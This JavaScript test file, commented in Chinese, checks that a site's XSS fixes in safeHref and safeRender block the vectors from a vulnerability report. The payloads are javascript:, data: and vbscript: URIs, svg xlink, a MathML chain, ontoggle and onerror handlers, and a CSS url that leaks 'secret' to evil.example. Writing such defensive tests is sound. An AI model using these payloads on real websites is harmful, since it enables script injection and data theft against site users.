/**
 * test-xss-fixes.mjs — 前端 XSS 修复验证（漏洞/index.html 与 article.html 相关）
 * 从 HTML 中抽取真实内联 JS 逻辑，用 jsdom + dompurify 模拟浏览器执行，
 * 覆盖漏洞报告中的 POC 向量：
 *   - index.html：a.link 未转义（javascript:/data:/vbscript:// 协议注入）
 *   - article.html：safeRender 手写白名单不完备（data: URI / svg+xlink / MathML /
 *                   details ontoggle / CSS 信息泄露 等绕过面）
 * 运行方式：node test-xss-fixes.mjs （依赖 dev-only 的 jsdom / dompurify）
 */
import { readFileSync } from 'node:fs';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';

let passed = 0;
let failed = 0;
function check(name, cond, extra = '') {
  if (cond) {
    passed++;
    console.log(`  ✓ ${name}`);
  } else {
    failed++;
    console.log(`  ✗ ${name} ${extra}`);
  }
}

/** 从源码中按起始标记 + 大括号配平提取顶层函数 */
function extractFn(src, fnName) {
  const marker = `function ${fnName}(`;
  const start = src.indexOf(marker);
  if (start === -1) throw new Error(`未找到 ${fnName}`);
  let i = src.indexOf('{', start);
  let depth = 0;
  for (; i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') {
      depth--;
      if (depth === 0) break;
    }
  }
  return src.slice(start, i + 1);
}

/* ================= 1. index.html：safeHref 协议白名单 ================= */
const indexSrc = readFileSync('index.html', 'utf8');
const indexScript = indexSrc.match(/<script>([\s\S]*?)<\/script>/)[1];
// 仅编译检查整段内联脚本（不执行）
new Function(indexScript);
check('index.html 内联脚本语法有效', true);

const safeHrefSrc = extractFn(indexScript, 'safeHref');
const safeHref = new Function(safeHrefSrc + ';return safeHref;')();
const linkVectors = [
  ['javascript:alert(1)', ''],
  ['  javascript:alert(1)', ''],
  ['java\tscript:alert(1)', ''],
  ['JAVASCRIPT:alert(1)', ''],
  ['JaVaScRiPt:alert(1)', ''],
  ['data:text/html;base64,PHNjcmlwdD4=', ''],
  ['vbscript:msgbox(1)', ''],
  ['//evil.com/x', ''],
  ['introduce.html', 'introduce.html'],
  ['index.html', 'index.html'],
  ['/a/b.html', '/a/b.html'],
  ['./a.html', './a.html'],
  ['#anchor', '#anchor'],
  ['https://example.com/a', 'https://example.com/a'],
  ['mailto:a@b.co', 'mailto:a@b.co'],
  ['', ''],
];
for (const [input, expect] of linkVectors) {
  const got = safeHref(input);
  check(`safeHref(${JSON.stringify(input)}) → ${JSON.stringify(expect)}`, got === expect, `got ${JSON.stringify(got)}`);
}

/* ================= 2. article.html：DOMPurify + 本地回退双路径 ================= */
const articleSrc = readFileSync('article.html', 'utf8');
const articleScript = articleSrc.match(/<script>\s*(\/\/ 文章详情[\s\S]*?)<\/script>/)[1];
new Function(`(function(){${articleScript}})`); // 仅编译检查
check('article.html 内联脚本语法有效', true);

// 提取白名单渲染块（ALLOWED_TAGS ... safeRender）与钩子注册块
const blockA = articleSrc.slice(
  articleSrc.indexOf('var ALLOWED_TAGS = ['),
  articleSrc.indexOf('// DOMPurify 钩子')
);
const hooksStart = articleSrc.indexOf('// DOMPurify 钩子');
const ifHookStart = articleSrc.indexOf('if (window.DOMPurify) {', hooksStart);
let i = articleSrc.indexOf('{', ifHookStart);
let depth = 0;
for (; i < articleSrc.length; i++) {
  if (articleSrc[i] === '{') depth++;
  else if (articleSrc[i] === '}') {
    depth--;
    if (depth === 0) break;
  }
}
const blockB = articleSrc.slice(ifHookStart, i + 1);

// jsdom 模拟浏览器环境
const dom = new JSDOM('<!doctype html><html><body></body></html>');
const { window } = dom;
const document = window.document;

// 与页面 script 标签一致：先加载 DOMPurify，再执行内联脚本（钩子注册）
const dompurify = createDOMPurify(window);
window.DOMPurify = dompurify;
const factory = new Function('window', 'document', blockA + '\n' + blockB + `
    ;return { safeRender, safeRenderLocal, isSafeUri, ALLOWED_TAGS, ALLOWED_ATTRS };`);
const m = factory(window, document);
check('article.html 渲染器工厂加载成功', typeof m.safeRender === 'function' && typeof m.safeRenderLocal === 'function');

// 漏洞报告 POC + 已知绕过向量；每条需在 DOMPurify 路径与本地回退路径下均被拦截
const cases = [
  { name: 'data: URI（报告 POC）', input: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnY3NyZicpPC9zY3JpcHQ+">click</a>', bad: /data:/i },
  { name: 'javascript: 协议', input: '<a href="javascript:alert(1)">x</a>', bad: /javascript:/i },
  { name: '实体混淆 javascript:', input: '<a href="&#106;avascript:alert(1)">x</a>', bad: /javascript:/i },
  { name: '制表符混淆 java\\tscript:', input: '<a href="java\tscript:alert(1)">x</a>', bad: /[jJ]ava\s*[sS]cript:/ },
  { name: 'vbscript: 协议', input: '<a href="vbscript:msgbox(1)">x</a>', bad: /vbscript:/i },
  { name: 'svg + xlink:href（报告向量）', input: '<svg><use xlink:href="javascript:alert(1)"></use></svg>', bad: /<svg|xlink/i },
  { name: 'MathML 组合（报告向量）', input: '<math><mtext><table><mglyph><svg><script>alert(1)</script></svg></mglyph></table></mtext></math>', bad: /<math|<svg/i },
  { name: 'details ontoggle（报告向量）', input: '<details ontoggle="alert(1)">x</details>', bad: /ontoggle/i },
  { name: 'CSS 信息泄露（报告向量）', input: '<div style="background:url(https://evil.example/?c=secret)">x</div>', bad: /style=/i },
  { name: 'img onerror', input: '<img src=x onerror=alert(1)>', bad: /onerror/i },
  { name: 'script 直插', input: '<script>alert(1)</script><p>ok</p>', bad: /<script/i },
  { name: 'iframe 直插', input: '<iframe src="https://evil.example/"></iframe>', bad: /<iframe/i },
];
for (const c of cases) {
  for (const [label, renderer] of [['DOMPurify', m.safeRender], ['本地回退', m.safeRenderLocal]]) {
    const out = renderer(c.input);
    check(`${c.name}［${label}］被拦截`, !c.bad.test(out), `output=${out}`);
  }
}

// 合法内容保留（两路径）
const good = [
  ['相对路径链接', '<a href="introduce.html">关于我</a>', /href="introduce\.html"/],
  ['https 外链', '<a href="https://example.com" target="_blank">ext</a>', /https:\/\/example\.com/],
  ['富文本基础标签', '<p>正文 <b>加粗</b> <code>code</code></p><ul><li>项</li></ul>', /<b>加粗<\/b>/],
  ['图片', '<img src="picture/成长.png" alt="成长">', /picture\/成长\.png/],
  ['pre/code', '<pre><code>console.log(1)</code></pre>', /console\.log\(1\)/],
  ['表格', '<table><thead><tr><th colspan="2">表头</th></tr></thead><tbody><tr><td>单元格</td><td rowspan="2">跨行</td></tr></tbody></table>', /<table|colspan="2"|rowspan="2"/],
];
for (const [name, input, keep] of good) {
  for (const [label, renderer] of [['DOMPurify', m.safeRender], ['本地回退', m.safeRenderLocal]]) {
    const out = renderer(input);
    check(`${name}［${label}］合法内容保留`, keep.test(out), `output=${out}`);
  }
}

// 外链 target="_blank" 补 rel=noopener（DOMPurify 路径）
{
  const out = m.safeRender('<a href="https://example.com" target="_blank">x</a>');
  check('外链补 rel="noopener"（DOMPurify）', /rel="[^"]*noopener/.test(out), `output=${out}`);
}

console.log('\n========================================');
console.log(`前端 XSS 修复验证：通过 ${passed} 项 / 失败 ${failed} 项`);
console.log('========================================');
process.exit(failed ? 1 : 0);
